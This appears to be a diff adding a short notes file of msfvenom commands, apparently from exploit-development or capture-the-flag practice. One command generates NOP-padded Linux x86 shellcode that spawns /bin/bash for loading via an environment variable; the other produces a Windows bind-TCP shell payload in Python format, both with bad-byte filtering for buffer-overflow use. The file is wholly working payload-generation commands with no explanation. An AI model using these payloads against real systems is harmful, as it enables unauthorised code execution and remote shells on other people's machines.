@@ -1,0 +1,4 @@
+# create x86 payload for env variable
+msfvenom -p linux/x86/exec CMD=/bin/bash --format bash -n 100 --pad-nops -b '\x00\xff' > to_source.sh
+
+msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d' --format python
